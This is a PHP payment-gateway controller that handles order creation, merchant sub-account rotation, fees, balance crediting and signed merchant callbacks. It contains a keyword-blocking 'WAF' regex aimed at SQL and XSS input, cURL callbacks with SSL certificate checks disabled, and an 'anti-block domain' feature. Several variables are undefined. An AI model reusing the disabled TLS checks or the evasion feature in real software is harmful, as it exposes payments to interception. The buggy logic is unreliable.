<?php

//技术QQ：1968984054
namespace Pay\Controller;

use Think\Controller;
use Think\Log;
class PayController extends Controller
{
    //商家信息
    protected $merchants;
    //网站地址
    protected $_site;
    //通道信息
    protected $channel;

    public function __construct()
    {
        parent::__construct();
        $this->_site = ((is_https()) ? 'https' : 'http') . '://' . C("DOMAIN") . '/';
    }
    /**
     * 创建订单
     * @param $parameter
     * @return array
     */
     
     //回调字符串安全检查  20220330 贱贱 QQ1968984054
     public function safe_WAF($data){
        
        if(preg_match('/\b(select|update|insert|set|from|script|alert|exp|replace|delete|where)\b|(c2VsZWN0|dXBkYXRl|d2hlcmU|aW5zZXJ0|c2V0|ZnJvbQ|c2NyaXB0|YWxlcnQ|ZXhw)|\\\\x|\\@a/ui', print_r($data,true),$data[5])){
             file_put_contents(dirname(__FILE__).'/notifylog/~XSS-log-'. date('Y-m-d') . '.log',"\r\n###### {$_SERVER['REMOTE_ADDR']} ".date('Y-m-d H:i:s')." ( http://".$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI']." ) ######\r\nXSS = ".var_export($xss,true).";",FILE_APPEND);
             exit('系统WAF检测到回调数据中存在敏感字符串！！！已禁止接收，有问题请联系管理员');
        
        }
     }
     //统一格式的json串   20220210 贱贱 QQ1968984054
	 public function json_msg($tzurl,$return,$data){
	    
	     if($tzurl){
	         file_put_contents(dirname( __FILE__ ).'/notifylog/~OrderSUCCESS-log-'. date('Y-m-d',$_SERVER['REQUEST_TIME']) . '.log','系统订单号：'.$return['orderid'].'成功信息-源串：'.$data."\n", FILE_APPEND);
 		      $msg='{"status":"1","msg":"下单成功","pay_amount":"'.$return['amount'].'","pay_orderid":"'.$return['orderid'].'","payUrl":"'.$tzurl.'"}';
 		      exit($msg);
		}else{
		    file_put_contents(dirname( __FILE__ ).'/notifylog/~OrderERROR-log-'. date('Y-m-d',$_SERVER['REQUEST_TIME']) . '.log','系统订单号：'.$return['orderid'].'错误信息-源串：'.$data.'错误内容:'.$json['msg']."\n", FILE_APPEND);
            $msg='{"status":"error","msg":"下单失败","content":"'.$data.'"}';
		     exit($msg);
	    	}
	    }
    public function orderadd($parameter)
    {
        $pay_amount = I("post.pay_amount", 0);
        
       
        
        //通道信息
        $this->channel = $parameter['channel'];
        //  var_dump($this->channel);
        
        $minmoney = M('channel')->where(['id'=>$this->channel['api']])->getField('min_money');
        if($minmoney !=0.00){
        if($pay_amount < $minmoney){
       $this->showmessage('该通道单笔最小金额为：<b style="color:ff0000;">'.$minmoney.'</b>&nbsp;&nbsp;元');
        }	
        }
        $maxmoney = M('channel')->where(['id'=>$this->channel['api']])->getField('max_money');
        if($maxmoney !=0.00){
         if($pay_amount > $maxmoney){
            $this->showmessage('该通道单笔最大金额为：<b style="color:ff0000;">'.$maxmoney.'</b>&nbsp;&nbsp;元');
         }
        }
        
         $minmoney = M('Product')
            ->where(['id' => $this->channel['pid']])
            ->getField('min_money');
     
        
        if($pay_amount < $minmoney){
       $this->showmessage('该通道单笔最小金额为：<b style="color:ff0000;">'.$minmoney.'</b>&nbsp;&nbsp;元');
        }	
        $maxmoney = M('Product')
            ->where(['id' => $this->channel['pid']])
            ->getField('max_money');
         if($pay_amount > $maxmoney){
            $this->showmessage('该通道单笔最大金额为：<b style="color:ff0000;">'.$maxmoney.'</b>&nbsp;&nbsp;元');
         }
        
        $gdmoney = M('channel')->where(['id'=>$this->channel['api']])->getField('gudingmoney');
    	$gdje = explode(',',$gdmoney);
    	if(!empty($gdmoney)){
        if(!in_array($pay_amount,$gdje)){ 
             $this->showmessage('此通道是固定金额通道，支持的金额为：<b style="color:ff0000;">'.$gdmoney.'</b>&nbsp;&nbsp;元');
        }
    	}
        //$this->merchants = $this->channel['userid'];
        //用户信息
        $usermodel       = D('Member');
        $this->merchants = $usermodel->get_Userinfo($this->channel['userid']);
    	//2022新增提交服务器IP限制 taoke 20220329 QQ1968984054
    	$pay_ip=$this->merchants['pay_ip'];
    	if(!empty($pay_ip)){
    	    	$payips = explode(',',$pay_ip);
    	    	 if(!in_array($_SERVER['REMOTE_ADDR'],$payips)){ 
         $this->showmessage('提交订单的服务器IP:'.$_SERVER['REMOTE_ADDR'].'，不在白名单范围内！请联系管理员添加！');
        }
    	}
        $return          = array();
        // 通道名称
        $PayName = $parameter["code"];
        // 交易金额比例
        $moneyratio = $parameter["exchange"];
        //商户编号
      
        $return["memberid"] = $userid = $this->merchants['id'] + 10000;
        $username = $this->merchants['username'];
        $m_Tikuanconfig     = M('Tikuanconfig');
        $tikuanconfig       = $m_Tikuanconfig->where(['userid' => $this->merchants['id']])->find();
        if (!$tikuanconfig || $tikuanconfig['tkzt'] != 1 || $tikuanconfig['systemxz'] != 1) {
            $tikuanconfig = $m_Tikuanconfig->where(['issystem' => 1])->find();
        }
        //费率
        $_userrate = M('Userrate')
            ->where(["userid" => $this->channel['userid'], "payapiid" => $this->channel['pid']])
            ->find();
        //银行通道费率
        $syschannel = M('Channel')
            ->where(['id' => $this->channel['api']])
            ->find();

        //---------------------------子账号风控start------------------------------------
        $channel_account_list        = M('channel_account')->where(['channel_id' => $syschannel['id'], 'status' => '1'])->select();
        $account_ids                 = M('UserChannelAccount')->where(['userid' => $this->channel['userid'], 'status' => 1])->getField('account_ids');
        if($account_ids){
             $account_ids  = explode(',',  $account_ids );
            foreach($channel_account_list as $k => $v){
                //如果不在指定的子账号，将其删除
                if(!in_array($v['id'], $account_ids )){
                    unset($channel_account_list[$k]);
                }
            }
        }
       
        $l_ChannelAccountRiskcontrol = new \Pay\Logic\ChannelAccountRiskcontrolLogic($pay_amount);
        $channel_account_item        = [];
        $error_msg                   = '已下线';
        foreach ($channel_account_list as $k => $v) {
            if ($v['offline_status'] && $v['control_status']) {
                //判断是自定义还是继承渠道的风控
                $temp_info               = $v['is_defined'] ? $v : $syschannel;
                $temp_info['account_id'] = $v['id']; //用于子账号风控类继承渠道风控机制时修改数据的id
                //子账号风控
                $l_ChannelAccountRiskcontrol->setConfigInfo($temp_info);
                $error_msg = $l_ChannelAccountRiskcontrol->monitoringData();
                if ($error_msg === true) {
                    $channel_account_item[] = $v;
                }
            } else if ($v['control_status'] == 0) {
                $channel_account_item[] = $v;
            }
        }

        // 按金额过滤可用商户：优先匹配配置了固定金额的商户；若未配置则视为通用商户
        $amountMatchedAccounts = array();
        foreach ($channel_account_item as $item) {
            if ($this->matchAccountAmount($item, $pay_amount)) {
                $amountMatchedAccounts[] = $item;
            }
        }
        if (!empty($amountMatchedAccounts)) {
            $channel_account_item = $amountMatchedAccounts;
        }

        // 过滤已占用商户：paying_money>0 视为该商户已被订单占用
        $freeAccountItems = array();
        foreach ($channel_account_item as $item) {
            if ($this->isAccountFree($item)) {
                $freeAccountItems[] = $item;
            }
        }
        if (!empty($freeAccountItems)) {
            $channel_account_item = $freeAccountItems;
        }

        if (empty($channel_account_item)) {
            $this->showmessage('该金额暂无可用商户，请稍后再试');
        }
        if (empty($channel_account_item)) {
            $this->showmessage('账户:' . $error_msg);
        }
        //-------------------------子账号风控end-----------------------------------------

        // 计算权重
        if (count($channel_account_item) == 1) {
            $channel_account = current($channel_account_item);
        } else {
            $channel_account = getWeight($channel_account_item);
        }

        $this->reserveChannelAccount($channel_account['id'], $pay_amount, $this->channel['userid'], $this->channel['api'], $pay_orderid);

        $syschannel['mch_id']    = $channel_account['mch_id'];
        $syschannel['signkey']   = $channel_account['signkey'];
        $syschannel['appid']     = $channel_account['appid'];
        $syschannel['appsecret'] = $channel_account['appsecret'];
        $syschannel['account']   = $channel_account['title'];
        $syschannel['account_id'] = $channel_account['id'];

        // 定制费率
        if ($channel_account['custom_rate']) {
            $syschannel['defaultrate'] = $channel_account['defaultrate'];
            $syschannel['fengding']    = $channel_account['fengding'];
            $syschannel['fengding']    = $channel_account['fengding'];
            $syschannel['rate']        = $channel_account['rate'];
        }
 
        //平台通道
        $platform = M('Product')
            ->where(['id' => $this->channel['pid']])
            ->find();
        if ($channel_account['unlockdomain']) {
            $unlockdomain = $channel_account['unlockdomain'] ? $channel_account['unlockdomain'] : '';
        } else {
            $unlockdomain = $syschannel['unlockdomain'] ? $syschannel['unlockdomain'] : '';
        }
           
        if($syschannel['fudong_status'] == "1"){//浮动金额开关
           $num = rand(0,$syschannel['fudong_money'])/100;
           $pay_amount = $pay_amount - $num;
         }
        //回调参数
        $return = [
            "mch_id"       => $syschannel["mch_id"], //商户号
            "signkey"      => $syschannel["signkey"], // 签名密钥
            "appid"        => $syschannel["appid"], // APPID
            "appsecret"    => $syschannel["appsecret"], // APPSECRET
            "gateway"      => $syschannel["gateway"] ? $syschannel["gateway"] : $parameter["gateway"], // 网关
            "notify_ip"        => $syschannel["notify_ip"], //回调限制IP
            "notifyurl"    => $syschannel["serverreturn"] ? $syschannel["serverreturn"] : $this->_site . "Pay_" .
            $PayName . "_notifyurl.html",
            "callbackurl"  => $syschannel["pagereturn"] ? $syschannel["pagereturn"] : $this->_site . "Pay_" .
            $PayName . "_callbackurl.html",
            'unlockdomain' => $unlockdomain, //防封域名
        ];

        //用户优先通道
        if ($tikuanconfig['t1zt'] == 0) { //T+0费率
            $feilv    = $_userrate['t0feilv'] ? $_userrate['t0feilv'] : $syschannel['t0defaultrate']; // 交易费率
            $fengding = $_userrate['t0fengding'] ? $_userrate['t0fengding'] : $syschannel['t0fengding']; // 封顶手续费
        } else { //T+1费率
            $feilv    = $_userrate['feilv'] ? $_userrate['feilv'] : $syschannel['defaultrate']; // 交易费率
            $fengding = $_userrate['fengding'] ? $_userrate['fengding'] : $syschannel['fengding']; // 封顶手续费
        }
        $fengding = $fengding == 0 ? 9999999 : $fengding; //如果没有设置封顶手续费自动设置为一个足够大的数字
        // var_dump($_userrate['t0feilv'] );
        // var_dump($feilv);die();
        //金额格式化

        if (!$pay_amount || !is_numeric($pay_amount) || $pay_amount <= 0) {
            $this->showmessage('金额错误');
        }
       
        $return["amount"] = floatval($pay_amount) * $moneyratio; // 交易金额
        $pay_sxfamount    = (($pay_amount * $feilv) > ($pay_amount * $fengding)) ? ($pay_amount * $fengding) :
        ($pay_amount * $feilv); // 手续费
        $pay_shijiamount = $pay_amount - $pay_sxfamount; // 实际到账金额
        if ($tikuanconfig['t1zt'] == 0) { //T+0费率
            $cost = bcmul($syschannel['t0rate'], $pay_amount, 2); //计算成本
        } else {
            $cost = bcmul($syschannel['rate'], $pay_amount, 2); //计算成本
        }
if(!empty(I('request.cid', 0, 'intval'))){
            $_REQUEST['type']=$_POST['remarks'];
          //  var_dump($_REQUEST['type'],$_POST);
        }
        //商户订单号
        $out_trade_id = $parameter['out_trade_id'];
        //生成系统订单号
        $pay_orderid = $parameter['orderid'] ? $parameter['orderid'] : get_requestord();
        //验签
        
  // var_dump($_POST);
  // exit("333");
       
        if ($this->verify()) {
            $Order                       = M("Order");
            $return['bankcode']          = $this->channel['pid'];
            $return['code']              = $platform['code']; //银行英文代码
            $return['syid']              = $platform['syid']; //银行英文代码
            $return['orderid']           = $pay_orderid; // 系统订单号
            $return['out_trade_id']      = $out_trade_id; // 外部订单号
            $return['subject']           = $parameter['body']; // 商品标题
            $data['pay_memberid']        = $userid;
            $data['pay_username']     	 = $username;
            $data['pay_orderid']         = $return["orderid"];
            $data['pay_amount']          = $pay_amount; // 交易金额
            $data['pay_poundage']        = $pay_sxfamount; // 手续费
            $data['pay_actualamount']    = $pay_shijiamount; // 到账金额
            $data['pay_applydate']       = time();
            $data['pay_bankcode']        = $this->channel['pid'];
            $data['pay_bankname']        = $platform['name'];
            $data['pay_notifyurl']       = I('post.pay_notifyurl', '');
            $data['pay_callbackurl']     = I('post.pay_callbackurl', '');
            $data['pay_status']          = 0;
            $data['pay_tongdao']         = $syschannel['code'];
            $data['pay_zh_tongdao']      = $syschannel['title'];
            $data['pay_channel_account'] = $syschannel['account'];
            $data['pay_ytongdao']        = $parameter["code"];
            $data['pay_yzh_tongdao']     = $parameter["title"];
            $data['pay_tjurl']           = $_SERVER['HTTP_REFERER'];
            $data['pay_productname']     = I("request.pay_productname");
            $data['attach']              = I("request.pay_attach");
            $data['out_trade_id']        = $out_trade_id;
            $data['ddlx']                = I("post.ddlx", 0);
            $data['memberid']            = $return["mch_id"];
            $data['key']                 = $return["signkey"];
            $data['account']             = $return["appid"];
            $data['cost']                = $cost;
            $data['cost_rate']           = $tikuanconfig['t1zt'] == 0 ? $syschannel['t0rate'] : $syschannel['rate'];
            $data['channel_id']          = $this->channel['api'];
            $data['account_id']          = $channel_account['id'];
            $data['t']                   = $tikuanconfig['t1zt'];
            $data['order_ip']            = $_SERVER['REMOTE_ADDR'];
           
            /*获取手机型号信息*/
            $user_agent = $_SERVER['HTTP_USER_AGENT'];
               if (stripos($user_agent, "SAMSUNG")!==false || stripos($user_agent, "Galaxy")!==false || strpos($user_agent, "GT-")!==false || strpos($user_agent, "SCH-")!==false || strpos($user_agent, "SM-")!==false) {
                    $brand = '三星';
                } else if (stripos($user_agent, "Huawei")!==false || stripos($user_agent, "Honor")!==false || stripos($user_agent, "H60-")!==false || stripos($user_agent, "H30-")!==false) {
                    $brand = '华为';
                } else if (stripos($user_agent, "Lenovo")!==false) {
                    $brand = '联想';
                } else if (strpos($user_agent, "MI-ONE")!==false || strpos($user_agent, "MI 1S")!==false || strpos($user_agent, "MI 2")!==false || strpos($user_agent, "MI 3")!==false || strpos($user_agent, "MI 4")!==false || strpos($user_agent, "MI-4")!==false) {
                    $brand = '小米';
                } else if (strpos($user_agent, "HM NOTE")!==false || strpos($user_agent, "HM201")!==false) {
                    $brand = '红米';
                } else if (stripos($user_agent, "Coolpad")!==false || strpos($user_agent, "8190Q")!==false || strpos($user_agent, "5910")!==false) {
                    $brand = '酷派';
                } else if (stripos($user_agent, "ZTE")!==false || stripos($user_agent, "X9180")!==false || stripos($user_agent, "N9180")!==false || stripos($user_agent, "U9180")!==false) {
                    $brand = '中兴';
                } else if (stripos($user_agent, "OPPO")!==false || strpos($user_agent, "X9007")!==false || strpos($user_agent, "X907")!==false || strpos($user_agent, "X909")!==false || strpos($user_agent, "R831S")!==false || strpos($user_agent, "R827T")!==false || strpos($user_agent, "R821T")!==false || strpos($user_agent, "R811")!==false || strpos($user_agent, "R2017")!==false) {
                    $brand = 'OPPO';
                } else if (strpos($user_agent, "HTC")!==false || stripos($user_agent, "Desire")!==false) {
                    $brand = 'HTC';
                } else if (stripos($user_agent, "vivo")!==false) {
                    $brand = 'vivo';
                } else if (stripos($user_agent, "K-Touch")!==false) {
                    $brand = '天语';
                } else if (stripos($user_agent, "Nubia")!==false || stripos($user_agent, "NX50")!==false || stripos($user_agent, "NX40")!==false) {
                    $brand = '努比亚';
                } else if (strpos($user_agent, "M045")!==false || strpos($user_agent, "M032")!==false || strpos($user_agent, "M355")!==false) {
                    $brand = '魅族';
                } else if (stripos($user_agent, "DOOV")!==false) {
                    $brand = '朵唯';
                } else if (stripos($user_agent, "GFIVE")!==false) {
                    $brand = '基伍';
                } else if (stripos($user_agent, "Gionee")!==false || strpos($user_agent, "GN")!==false) {
                    $brand = '金立';
                } else if (stripos($user_agent, "HS-U")!==false || stripos($user_agent, "HS-E")!==false) {
                    $brand = '海信';
                } else if (stripos($user_agent, "Nokia")!==false) {
                    $brand = '诺基亚';
                } 
                /*获取手机型号信息end*/
                           $agent = strtolower($_SERVER['HTTP_USER_AGENT']);  
                $is_pc = (strpos($agent, 'windows nt')) ? true : false;  
                $is_iphone = (strpos($agent, 'iphone')) ? true : false;  
                $is_ipad = (strpos($agent, 'ipad')) ? true : false;  
                $is_android = (strpos($agent, 'android')) ? true : false;  
                   if($is_pc){
                   	 $data['mobile']            = "windows " . $brand;
                   }
                    if($is_android){
                   	 $data['mobile']            = "android " . $brand;
                   }
                   if($is_iphone){
                   	 $data['mobile']            = "iphone " .$brand;
                   }
                   if($is_ipad){
                   	 $data['mobile']            = "ipad " . $brand;
                   }
                   
            //添加订单
            // var_dump($Order->add($data));
            //   echo $Order->getDbError();
            if ($Order->add($data)) {
                $return['datetime'] = date('Y-m-d H:i:s', $data['pay_applydate']);
                $return["status"]   = "success";
                Log::record('上游接口上送数据:' . PHP_EOL . json_encode($return) . PHP_EOL, Log::INFO);
                return $return;
            } else {
                $this->showmessage('系统错误');
            }
        } else {
            $this->showmessage('签名验证失败', $_POST);
        }
    }
    /*获取商户密钥，用于回调验证签名*/
    protected function getKey($out_trade_no){
    $key = M('Order')->where(['pay_orderid'=>$out_trade_no])->getField('key');
    return $key;
    }  
    /*通道回调IP验证*/
    protected function notify_ip($out_trade_no,$ip){
    $channel_id = M('Order')->where(['pay_orderid'=>$out_trade_no])->getField('channel_id');
    $notify_ip=M('channel')->where(['id'=>$channel_id])->getField('notify_ip');
     if(!empty($notify_ip)){
    	    	$notifyips = explode(',',$notify_ip);
    	if(!in_array($ip,$notifyips)){ 
         exit('回调IP:'.$_SERVER['REMOTE_ADDR'].'，不在白名单范围内！请联系管理员添加！');
        }
     } 
    } 
    /**
     * 回调处理订单
     * @param $TransID
     * @param $PayName
     * @param int $returntype
     */
    protected function EditMoney($trans_id, $pay_name = '', $returntype = 1,$true_amount)
    {
        
        $m_Order    = M("Order");
        $order_info = $m_Order->where(['pay_orderid' => $trans_id])->find(); //获取订单信息
        if(!empty($true_amount)){
           M('Order')->where(['pay_orderid'=>$trans_id])->save(['true_amount'=>$true_amount]);
           if($true_amount<>$order_info['pay_amount']){ //如果实付金额大于小于提交金额，就飘红
           	M('Order')->where(['pay_orderid'=>$trans_id])->save(['tijiaomoey'=>$order_info['pay_amount']]);
           }
        }
       
		if($realmoney){
			$realdata['pay_amount'] = $realmoney;
			$realdata['pay_poundage'] = $realmoney*0.045;
			$realdata['pay_actualamount'] = $realmoney*0.955;
			$m_Order->where(['pay_orderid' => $trans_id])->save($realdata);
		}
        $userid     = intval($order_info["pay_memberid"] - 10000); // 商户ID
        $time       = time(); //当前时间

        //********************************************订单支付成功上游回调处理********************************************//
        if ($order_info["pay_status"] == 0) {
            //开启事物
            M()->startTrans();
            //查询用户信息
            $m_Member    = M('Member');
            $member_info = $m_Member->where(['id' => $userid])->lock(true)->find();
            //更新订单状态 1 已成功未返回 2 已成功已返回
            $res = $m_Order->where(['pay_orderid' => $trans_id, 'pay_status' => 0])
                ->save(['pay_status' => 1, 'pay_successdate' => $time]);
            if (!$res) {
                M()->rollback();
                return false;
            }
            //-----------------------------------------修改用户数据 商户余额、冻结余额start-----------------------------------
            //要给用户增加的实际金额（扣除投诉保证金）
            $actualAmount          = $order_info['pay_actualamount'];
            $complaintsDepositRule = $this->getComplaintsDepositRule($userid);
            if (isset($complaintsDepositRule['status']) && $complaintsDepositRule['status'] == 1) {
                if ($complaintsDepositRule['ratio'] > 100) {
                    $complaintsDepositRule['ratio'] = 100;
                }
                $depositAmount = round($complaintsDepositRule['ratio'] / 100 * $actualAmount, 4);
                $actualAmount -= $depositAmount;
            }

            //创建修改用户修改信息
            $member_data = [
                'last_paying_time'   => $time,
                'unit_paying_number' => ['exp', 'unit_paying_number+1'],
                'unit_paying_amount' => ['exp', 'unit_paying_amount+' . $actualAmount],
                'paying_money'       => ['exp', 'paying_money+' . $actualAmount],
            ];

            //判断用结算方式
            switch ($order_info['t']) {
                case '0':
                //t+0结算
                case '7':
                //t+7 只限制提款和代付时间，每周一允许提款
                case '30':
                    //t+30 只限制提款和代付时间，每月第一天允许提款
                    $ymoney                 = $member_info['balance']; //改动前的金额
                    $gmoney                 = bcadd($member_info['balance'], $actualAmount, 4); //改动后的金额
                    $member_data['balance'] = ['exp', 'balance+' . $actualAmount]; //防止数据库并发脏读
                    break;
                case '1':
                    //t+1结算，记录冻结资金
                    $blockedlog_data = [
                        'userid'     => $userid,
                        'orderid'    => $order_info['pay_orderid'],
                        'amount'     => $actualAmount,
                        'thawtime'   => (strtotime('tomorrow') + rand(0, 7200)),
                        'pid'        => $order_info['pay_bankcode'],
                        'createtime' => $time,
                        'status'     => 0,
                    ];
                    $blockedlog_result = M('Blockedlog')->add($blockedlog_data);
                    if (!$blockedlog_result) {
                        M()->rollback();
                        return false;
                    }
                    $ymoney                        = $member_info['blockedbalance']; //原冻结资金
                    $gmoney                        = bcadd($member_info['blockedbalance'], $actualAmount, 4); //改动后的冻结资金
                    $member_data['blockedbalance'] = ['exp', 'blockedbalance+' . $actualAmount]; //防止数据库并发脏读

                    break;
                default:
                    # code...
                    break;
            }

            $member_result = $m_Member->where(['id' => $userid])->save($member_data);
            if ($member_result != 1) {
                M()->rollback();
                return false;
            }

            // 商户充值金额变动
            $moneychange_data = [
                'userid'     => $userid,
                'ymoney'     => $ymoney, //原金额或原冻结资金
                'money'      => $actualAmount,
                'gmoney'     => $gmoney, //改动后的金额或冻结资金
                'datetime'   => date('Y-m-d H:i:s'),
                'tongdao'    => $order_info['pay_bankcode'],
                'transid'    => $trans_id,
                'orderid'    => $order_info['out_trade_id'],
                'contentstr' => $order_info['out_trade_id'] . '订单充值,结算方式：t+' . $order_info['t'],
                'lx'         => 1,
                't'          => $order_info['t'],
            ];

            $moneychange_result = $this->MoenyChange($moneychange_data); // 资金变动记录

            if ($moneychange_result == false) {
                M()->rollback();
                return false;
            }

            // 记录投诉保证金
            if (isset($depositAmount) && $depositAmount > 0) {
                $depositResult = M('ComplaintsDeposit')->add([
                    'user_id'       => $userid,
                    'pay_orderid'   => $trans_id,
                    'out_trade_id'  => $order_info['out_trade_id'],
                    'freeze_money'  => $depositAmount,
                    'unfreeze_time' => time() + $complaintsDepositRule['freeze_time'],
                    'status'        => 0,
                    'create_at'     => time(),
                    'update_at'     => time(),
                ]);
                if ($depositResult == false) {
                    M()->rollback();
                    return false;
                }
            }

            // 通道ID
            $bianliticheng_data = [
                "userid"  => $userid, // 用户ID
                "transid" => $trans_id, // 订单号
                "money"   => $order_info["pay_amount"], // 金额
                "tongdao" => $order_info['pay_bankcode'],
            ];
            $this->bianliticheng($bianliticheng_data); // 提成处理
            M()->commit();

            //-----------------------------------------修改用户数据 商户余额、冻结余额end-----------------------------------

            //-----------------------------------------修改通道风控支付数据start----------------------------------------------
            $m_Channel     = M('Channel');
            $channel_where = ['id' => $order_info['channel_id']];
            $channel_info  = $m_Channel->where($channel_where)->find();
            //判断当天交易金额并修改支付状态
            $channel_res = $this->saveOfflineStatus(
                $m_Channel,
                $order_info['channel_id'],
                $order_info['pay_amount'],
                $channel_info
            );

            //-----------------------------------------修改通道风控支付数据end------------------------------------------------

            //-----------------------------------------修改子账号风控支付数据start--------------------------------------------
            $m_ChannelAccount      = M('ChannelAccount');
            $channel_account_where = ['id' => $order_info['account_id']];
            $channel_account_info  = $m_ChannelAccount->where($channel_account_where)->find();
            if ($channel_account_info['is_defined'] == 0) {
                //继承自定义风控规则
                $channel_info['paying_money'] = $channel_account_info['paying_money']; //当天已交易金额应该为子账号的交易金额
                $channel_account_info         = $channel_info;
            }
            //判断当天交易金额并修改支付状态
            $channel_account_res = $this->saveOfflineStatus(
                $m_ChannelAccount,
                $order_info['account_id'],
                $order_info['pay_amount'],
                $channel_account_info
            );
            if ($channel_account_info['unit_interval']){
                $m_ChannelAccount->where([
                    'id' => $order_info['account_id'],
                ])->save([
                    'unit_paying_number' => ['exp', 'unit_paying_number+1'],
                    'unit_paying_amount' => ['exp', 'unit_paying_amount+' . $order_info['pay_actualamount']],
                ]);
            }

            $this->releaseChannelAccount($order_info['account_id'], $order_info['pay_orderid'], $order_info['pay_amount']);

            //-----------------------------------------修改子账号风控支付数据end----------------------------------------------

        }

        //**************给下游商户发送回调，支付跳转**************//
        $return_array = [ // 返回字段
            "memberid"       => $order_info["pay_memberid"], // 商户ID
            "orderid"        => $order_info['out_trade_id'], // 订单号
            'transaction_id' => $order_info["pay_orderid"], //支付流水号
            "amount"         => $order_info["pay_amount"], // 交易金额
            "true_amount"    => $order_info["pay_amount"], // 用户实付金额
            "datetime"       => date("YmdHis"), // 交易时间
            "returncode"     => "00", // 交易状态
        ];
        if (!isset($member_info)) {
            $member_info = M('Member')->where(['id' => $userid])->find();
        }
        $sign                   = $this->createSign($member_info['apikey'], $return_array);
        $return_array["sign"]   = $sign;
        $return_array["attach"] = $order_info["attach"];
       Log::record('同步通知参数：' . json_encode($return_array), Log::INFO);
        switch ($returntype) {
            case '0':
                $notifystr = "";
                foreach ($return_array as $key => $val) {
                    $notifystr = $notifystr . $key . "=" . $val . "&";
                }
                $notifystr = rtrim($notifystr, '&');
                $ch        = curl_init();
                curl_setopt($ch, CURLOPT_TIMEOUT, 10);
                curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($ch, CURLOPT_POST, 1);
                curl_setopt($ch, CURLOPT_URL, $order_info["pay_notifyurl"]);
                curl_setopt($ch, CURLOPT_POSTFIELDS, $notifystr);
                $contents = curl_exec($ch);
                curl_close($ch);
                $notify_msg = $contents;
                if(empty($_REQUEST)){
                 $tongdao_msg= file_get_contents('php://input');
                }else{
                 $tongdao_msg=json_encode($_REQUEST,true);
                }
                $add_msg['notify_msg']=$notify_msg;
                $add_msg['tongdao_msg']=$tongdao_msg;
               $add_msged= M('Order')->where(['pay_orderid'=>$order_info["pay_orderid"]])->save($add_msg);
             
                //$httpCode = curl_getinfo($ch,CURLINFO_HTTP_CODE);
                log_server_notify($order_info["pay_orderid"], $order_info["pay_notifyurl"], $notifystr, $contents);
                if (strstr(strtolower($contents), "ok") != false) {
                    //更新交易状态
                    $order_where = [
                        'id'          => $order_info['id'],
                        'pay_orderid' => $order_info["pay_orderid"],
                    ];
                    $order_result = $m_Order->where($order_where)->setField("pay_status", 2);
                  Log::record('异步通知成功，订单号：' . $order_info["pay_orderid"], Log::INFO);
                  Log::record('异步通知成功，异步地址为：' . $order_info["pay_notifyurl"], Log::INFO);
                  Log::record('异步通知成功，返回信息为：' . $contents, Log::INFO);
                  Log::record('异步通知成功，异步签名为：' . $sign, Log::INFO);
                } else {
                    // $this->jiankong($order_info['pay_orderid']);
                  //失败
                Log::record('异步通知失败：返回信息：' . json_encode($contents), Log::INFO);
                }
                break;

            case '1':
                $this->setHtml($order_info["pay_callbackurl"], $return_array);
                break;

            default:
                # code...
                break;
        }
    }

    //修改渠道跟账号风控状态
    protected function saveOfflineStatus($model, $id, $pay_amount, $info)
    {
        if ($info['offline_status'] && $info['control_status'] && $info['all_money'] > 0) {
            //通道是否开启风控和支付状态为上线
            $data['paying_money']     = bcadd($info['paying_money'], $pay_amount, 4);
            $data['last_paying_time'] = time();

            if ($data['paying_money'] >= $info['all_money']) {
                $data['offline_status'] = 0;
            }
            return $model->where(['id' => $id])->save($data);
        }
        return true;
    }

    protected function matchAccountAmount($account, $amount)
    {
        $amountStr = (string)intval(round($amount));
        $pool = $this->parseAmountPool(isset($account['gudingmoney']) ? $account['gudingmoney'] : '');
        if (empty($pool)) {
            return true;
        }
        return in_array($amountStr, $pool);
    }

    protected function parseAmountPool($value)
    {
        $value = trim((string)$value);
        if ($value === '' || $value === '0' || $value === '0.00') {
            return array();
        }
        $parts = preg_split('/[\s,，|]+/', $value);
        $pool = array();
        foreach ($parts as $part) {
            $part = trim($part);
            if ($part === '') {
                continue;
            }
            $pool[] = (string)intval(round(floatval($part)));
        }
        return array_values(array_unique($pool));
    }

    protected function isAccountFree($account)
    {
        $payingMoney = isset($account['paying_money']) ? floatval($account['paying_money']) : 0;
        $offlineStatus = isset($account['offline_status']) ? intval($account['offline_status']) : 0;
        return $offlineStatus == 1 && $payingMoney <= 0;
    }

    protected function reserveChannelAccount($accountId, $amount, $userid, $channelId, $orderId)
    {
        $accountId = intval($accountId);
        if (!$accountId) {
            return false;
        }

        $m = M('ChannelAccount');
        $info = $m->where(['id' => $accountId])->find();
        if (!$info) {
            return false;
        }

        $money = isset($info['paying_money']) ? floatval($info['paying_money']) : 0;
        if ($money > 0) {
            return false;
        }

        $qrcodeUrl = $this->buildMerchantQrUrl($accountId, $amount, $orderId);
        return $m->where(['id' => $accountId, 'paying_money' => array('elt', 0)])->save(array(
            'paying_money' => $amount,
            'last_paying_time' => time(),
            'current_orderid' => $orderId,
            'current_qrcode_url' => $qrcodeUrl,
        ));
    }

    protected function releaseChannelAccount($accountId, $orderId, $amount = 0)
    {
        $accountId = intval($accountId);
        if (!$accountId) {
            return false;
        }
        $row = M('ChannelAccount')->where(['id' => $accountId])->find();
        if (empty($row)) {
            return false;
        }
        $current = floatval(isset($row['paying_money']) ? $row['paying_money'] : 0);
        $amount = floatval($amount);
        if ($amount > 0 && $current > 0 && abs($current - $amount) > 0.0001) {
            return true;
        }
        return M('ChannelAccount')->where(['id' => $accountId])->save(array(
            'paying_money' => 0,
            'last_paying_time' => time(),
            'current_orderid' => '',
            'current_qrcode_url' => '',
        ));
    }

    protected function buildMerchantQrUrl($accountId, $amount, $orderId)
    {
        $seed = md5($accountId . '|' . $amount . '|' . $orderId . '|' . time());
        return U('Pay/Pay/merchantQr', array(
            'aid' => $accountId,
            'orderid' => $orderId,
            'amount' => $amount,
            'seed' => $seed,
        ));
    }

    /**
     *  验证签名
     * @return bool
     */
    protected function verify()
    {
        if(!empty(I('request.cid', 0, 'intval'))){
            $_REQUEST['pay_memberid']=10000+$_POST['userid'];
        }
        //POST参数
        $requestarray = array(
            'pay_memberid'    => I('request.pay_memberid', 0, 'intval'),
            'pay_orderid'     => I('request.pay_orderid', ''),
            'pay_amount'      => I('request.pay_amount', ''),
            'pay_applydate'   => I('request.pay_applydate', ''),
            'pay_bankcode'    => I('request.pay_bankcode', ''),
            'pay_notifyurl'   => I('request.pay_notifyurl', ''),
